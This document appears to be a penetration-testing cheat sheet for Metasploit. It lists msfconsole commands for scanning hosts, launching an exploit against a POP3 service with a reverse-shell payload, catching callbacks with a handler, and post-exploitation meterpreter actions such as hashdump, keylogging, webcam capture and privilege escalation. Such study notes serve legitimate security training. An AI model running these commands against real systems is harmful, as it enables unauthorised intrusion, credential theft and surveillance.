# Metasploit

## Msfconsole

### Exploring

Start: `msfconsole`

View auxiliary modules: `show auxiliary`

Use modules: `use auxiliary/scanner/snmp/snmp_enum`

View module options: `show options`

Set global session values: `setg RHOSTS 10.11.1.5`

### Database access

MSF logs findings and information about discovered hosts in a database

View discovered hosts: `hosts`

Use the db\_nmap wrapper to scan: `db_nmap 10.11.1.5`

Search for machines open ports: `services -p 443`

### Exploit modules

Search exploits: `search pop3`

Use exploit: `use exploit/windows/pop3/seattlelab_pass`

View options: `show options`

Set options: `set RHOST 10.11.1.5`

View payloads: `show payloads`

Select payload: `set payload windows/shell/reverse_tcp`

View payload options: `show options`

Once configured, run exploit: `exploit`

### **Multi Handler**

Used to receive callbacks from meterpreter payloads

`use exploit/multi/handler`

Set payload to match msfvenom command used to generate shell

Set IP address and port

`run`

### Meterpreter payloads – provide additional features and functionality

View system info: `sysinfo`

View UID: `getuid`

Search files: `search string`

Upload files: `upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec` two  characters required to prevent shell escaping

Download files: `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`

Invoke a command shell: `shell`

### Post exploitation

`help` displays a list of available meterpreter post exploitation commands

Includes: download, upload, portfwd, route, keyscan\_start/stop, screenshot, record\_mic, webcam\_snap, getsystem \(priv esc\), hashdump

Useful tool for finding priv esc options `use post/multi/recon/local_exploit_suggester`



